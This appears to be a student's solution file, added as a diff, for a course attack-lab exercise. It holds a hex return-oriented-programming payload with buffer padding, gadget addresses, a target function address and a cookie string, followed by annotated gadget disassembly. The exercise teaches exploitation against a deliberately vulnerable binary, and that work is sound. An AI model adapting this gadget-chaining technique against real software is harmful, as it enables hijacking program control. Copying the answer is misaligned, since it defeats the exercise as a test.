@@ -1,0 +1,18 @@
+00 00 00 00 00 00 00 00 /* first 24(buffer size) bytes here are just padding */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+e7 14 40 00 00 00 00 00 /* pop rax */
+20 00 00 00 00 00 00 00 /* empty line */
+bd 15 40 00 00 00 00 00 /* eax -> edx */
+ca 15 40 00 00 00 00 00 /* edx -> ecx */
+32 15 40 00 00 00 00 00 /* ecx -> esi */
+1f 15 40 00 00 00 00 00 /* rsp -> rax */
+f3 14 40 00 00 00 00 00 /* rax -> rdi */
+fe 14 40 00 00 00 00 00 /* add_xy function */
+f3 14 40 00 00 00 00 00 /* rax -> rdi, function 153 */
+25 14 40 00 00 00 00 00 /* touch3 address */
+36 61 35 39 34 38 33 66 /* cookie as string */
+
+/* 4015bc:	b8 89 c2 38 db       	mov    $0xdb38c289,%eax  eax -> edx */
+/* 4015c8:	c7 07 89 d1 08 c9    	movl   $0xc908d189,(%rdi) edx -> ecx */
+/* 401530:	c7 07 89 ce 08 d2    	movl   $0xd208ce89,(%rdi) ecx -> esi */
